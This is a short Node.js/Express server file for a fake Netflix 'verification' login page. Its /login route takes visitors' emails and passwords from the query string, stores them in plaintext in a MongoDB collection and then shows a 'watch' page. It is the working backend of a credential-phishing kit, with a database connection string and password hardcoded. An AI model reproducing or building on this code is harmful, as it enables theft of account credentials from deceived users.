const express = require('express');
const mongoose = require('mongoose');
const path =require('path');
const app = express()
const port = 3000

const DB = 'mongodb+srv://hacker123:hacker123@netflix-users.ipzhalx.mongodb.net/netflix?retryWrites=true&w=majority';
mongoose.connect(DB).then(
  console.log('connected to db')
).catch((err) => {
  console.log(err);
})
const userSchema = mongoose.Schema({
  username: {
    type: String,
    required: true
  },
  password: {
    type: String,
    required: true
  }
})
app.set('view engine', 'pug');
app.set('views', path.join(__dirname, './netflix'));
app.use(express.static(path.join(__dirname,'./netflix')));
app.get('/', (req, res) => {
  res.send('Hello World!')
})
const User  = mongoose.model('users',userSchema);

app.get('/verification',(req,res)=>{
  res.status(200).render('index.pug');
})
app.get('/login',(req,res)=>{
  let username = req.query.email;
  let password = req.query.password;
  const user = new User({ username, password });
  user.save().then(() => {
    console.log('hogaya');
    res.status(200).render('watch.pug');
  }).catch((err) => {
    console.log(err);
    res.status(200)
    res.redirect('*');
  })
})
app.get('*',(req,res)=>{
  res.send('error');
})
app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})